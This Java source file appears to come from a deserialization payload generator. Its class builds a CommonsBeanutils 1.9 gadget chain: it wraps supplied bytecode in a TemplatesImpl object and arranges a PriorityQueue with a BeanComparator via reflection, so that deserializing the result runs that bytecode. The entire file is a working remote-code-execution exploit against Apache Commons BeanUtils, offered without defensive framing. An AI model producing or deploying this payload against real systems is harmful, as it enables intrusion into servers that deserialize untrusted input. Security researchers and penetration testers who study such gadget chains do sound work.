package com.reajason.javaweb.deserialize.payload;

import com.reajason.javaweb.deserialize.Payload;
import com.reajason.javaweb.deserialize.TemplateUtils;
import com.reajason.javaweb.deserialize.utils.Reflections;
import lombok.SneakyThrows;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

/**
 * @author ReaJason
 * @since 2024/12/3
 */
public class CommonsBeanutils19 implements Payload {
    @Override
    @SneakyThrows
    public Object generate(byte[] bytes) {
        Object obj = TemplateUtils.createTemplatesImpl(bytes);
        final BeanComparator<Object> comparator = new BeanComparator<>(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add("1");
        queue.add("1");
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(queue, "queue", new Object[]{obj, obj});
        return queue;
    }
}